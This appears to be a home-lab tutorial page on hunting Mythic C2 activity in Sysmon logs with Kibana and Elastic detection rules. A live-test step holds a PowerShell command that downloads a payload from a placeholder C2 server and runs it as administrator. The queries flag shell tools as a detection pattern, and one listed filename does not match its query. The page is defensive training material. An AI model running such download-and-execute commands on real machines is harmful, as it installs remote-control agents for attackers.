<h2>🕵️‍♂️ Day 28: Mythic C2 Threat Hunting - Investigating Command and Control</h2>

<h3>✅ Objective:</h3>
<p>Investigate activity related to the <strong>Mythic C2 framework</strong> using Sysmon logs via Kibana Discover and Dashboards.</p>

<hr>

<h3>🔍 Step-by-Step Threat Hunting Approach</h3>

<h4>1. Known IOC Investigation (Cheat Method)</h4>
<pre>
Filename: servicehost-dstepenrocks.exe
Location: C:\Users\Public\Downloads\
</pre>
<ul>
  <li>Go to <strong>Discover</strong> in Kibana</li>
  <li>Set time to <code>Last 30 days</code></li>
  <li>Query: <code>winlog.event_data.Image: "svchost-dvlncl.exe"</code></li>
  <li>Sort timestamp from <strong>old to new</strong></li>
  <li>Review full process chain</li>
</ul>

<h4>2. Unknown C2 Discovery (Generic Threat Hunting)</h4>

<h5>A. Network Behavior (Sysmon Event ID 3)</h5>
<pre>
event.code: "3" AND NOT winlog.event_data.Image: "MsMpEng.exe"
</pre>
<ul>
  <li>Identify unusual outbound ports (e.g., 9999, 80)</li>
  <li>Check image path of calling processes (e.g., Downloads folder)</li>
  <li>Flag processes like <code>powershell.exe</code>, <code>rundll32.exe</code>, or <code>cmd.exe</code></li>
</ul>

<h5>B. Process Creation (Sysmon Event ID 1)</h5>
<pre>
event.code: "1" AND winlog.event_data.Image.keyword : "*rundll32.exe" OR "*powershell.exe" OR "*cmd.exe"
</pre>

<hr>

<h3>📌 Timeline Building</h3>
<p>Pivot across event types using <code>ProcessGuid</code>:</p>

<table border="1" cellpadding="6">
  <tr>
    <th>Event Type</th>
    <th>Description</th>
  </tr>
  <tr>
    <td>File Created (11)</td>
    <td><code>C:\Users\...\Downloads\servicehost-*.exe</code></td>
  </tr>
  <tr>
    <td>Executable Detected (29)</td>
    <td>Confirms PE file creation</td>
  </tr>
  <tr>
    <td>Process Created (1)</td>
    <td>Execution of the C2 agent</td>
  </tr>
  <tr>
    <td>Network Connection (3)</td>
    <td>Outbound to <code><your mythic server ip>:9999</code></td>
  </tr>
</table>

<hr>

<h3>🛠️ Detection Rule Setup (Elastic Security)</h3>
<ul>
  <li>Update rule schedule to <strong>every 1 minute</strong></li>
  <li>Action: Send webhook to OS Ticket</li>
  <li>Enable highlighted fields:
    <ul>
      <li><code>winlog.event_data.Image</code></li>
      <li><code>destination.ip</code></li>
      <li><code>destination.port</code></li>
    </ul>
  </li>
</ul>

<hr>

<h3>💡 Correlation Fields to Use</h3>
<ul>
  <li><code>winlog.event_data.ProcessGuid</code></li>
  <li><code>winlog.event_data.ParentImage</code></li>
  <li><code>winlog.event_data.DestinationIp</code></li>
  <li><code>winlog.event_data.CommandLine</code></li>
</ul>

<hr>

<h3>🧪 Live Agent Test</h3>
<ol>
  <li>Download payload:
    <pre>powershell -Command "Invoke-WebRequest -Uri http://<your mythic server ip>:9999/mydfir-d30.exe -OutFile C:\Users\Public\Downloads\mydfir-d30.exe"</pre>
  </li>
  <li>Run as administrator</li>
  <li>Verify Mythic callback</li>
  <li>Check Kibana Discover for file create, process create, and network connection logs</li>
</ol>

<hr>

<h3>🎯 Outcome</h3>
<ul>
  <li>Confirmed Mythic C2 activity via Sysmon logs</li>
  <li>Auto-generated alert linked to OS Ticket</li>
  <li>Manual investigation validated C2 execution chain</li>
</ul>

<p><em>Continue building dashboards and rules to cover additional attack vectors like Atomic Red Team or Caldera.</em></p>
